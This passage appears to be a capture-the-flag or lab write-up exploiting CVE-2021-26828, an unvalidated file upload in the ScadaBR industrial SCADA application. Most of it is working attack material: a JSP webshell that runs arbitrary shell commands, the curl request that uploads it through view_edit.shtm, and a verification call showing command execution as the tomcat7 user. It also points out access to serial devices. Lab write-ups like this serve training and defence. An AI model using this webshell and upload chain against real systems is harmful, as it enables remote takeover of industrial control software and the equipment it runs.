## CVE-2021-26828 — arbitrary file upload

ScadaBR's graphical views feature lets you upload a background image through `view_edit.shtm`. The version in this room doesn't validate file extensions, so you can drop a JSP straight into the Tomcat webroot.

### The webshell

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
    BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = in.readLine()) != null) {
      out.println(line);
    }
  }
%>
```

### Upload it

```bash
curl -i -b cookies.txt -X POST \
  -F "view.name=pwn" \
  -F "view.xid=GV_pwn" \
  -F "backgroundImageMP=@brr.jsp;type=application/octet-stream" \
  -F "upload=Upload image" \
  http://<TARGET_IP>:8080/ScadaBR/view_edit.shtm
```

The response HTML contained the upload path:

```html
<img id="viewBackground" src="uploads/1.jsp" ... />
```

### Verify

```bash
curl -i "http://<TARGET_IP>:8080/ScadaBR/uploads/1.jsp?cmd=id"
```

```
uid=107(tomcat7) gid=110(tomcat7) groups=110(tomcat7),20(dialout)
```

Code execution as `tomcat7`. Notice `dialout` in the groups — that's the group that owns serial devices.

